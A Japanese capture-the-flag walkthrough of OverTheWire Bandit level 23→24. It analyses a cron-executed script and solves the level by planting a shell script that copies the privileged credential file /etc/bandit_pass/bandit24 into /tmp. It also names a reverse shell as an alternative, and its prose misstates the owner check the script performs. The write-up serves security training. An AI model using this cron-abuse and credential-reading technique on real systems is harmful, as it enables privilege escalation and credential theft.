```

Bandit Level 23 → Level 24
Level Goal

A program is running automatically at regular intervals from cron, the time-based job scheduler. Look in /etc/cron.d/ for the configuration and see what command is being executed.

NOTE: This level requires you to create your own first shell-script. This is a very big step and you should be proud of yourself when you beat this level!

NOTE 2: Keep in mind that your shell script is removed once executed, so you may want to keep a copy around…
Commands you may need to solve this level

chmod, cron, crontab, crontab(5) (use “man 5 crontab” to access this)
```

今回もcron問題。  

同様に`/etc/cron.d/`から今回の問題に使いそうなものを開く。  

```
bandit23@bandit:~$ cat /etc/cron.d/cronjob_bandit24
@reboot bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
* * * * * bandit24 /usr/bin/cronjob_bandit24.sh &> /dev/null
bandit23@bandit:~$ cat /usr/bin/cronjob_bandit24.sh
#!/bin/bash

myname=$(whoami)

cd /var/spool/$myname/foo
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." -a "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" ./$i)"
        if [ "${owner}" = "bandit23" ]; then
            timeout -s 9 60 ./$i
        fi
        rm -f ./$i
    fi
done
```

`/usr/bin/cronjob_bandit24.sh`の動きは、  
`/var/spool/bandit24/foo`に移動 -> ファイルが「.」「..」じゃないことを確認 -> カレントディレクトリ配下のファイルの所有者が"bandit24"であると確認  
-> 最大60秒でシェルスクリプトを実行させる -> シェルスクリプトを実行後そのファイルを削除  


つまり、/var/spool/bandit24/foo配下に次の資格情報を見られるようなシェルスクリプトを配置する。  
bandit24権限のリバースシェルを取得、bandit23権限でも見られるようbandit24で資格情報を出力するなど方法がある。  

今回は2つ目の方法で行う。  

以下のスクリプトを設置する。  
```
#!/bin/bash

cat /etc/bandit_pass/bandit24 > /tmp/tmp.XAL1xYe68n/pass
```

クリア  


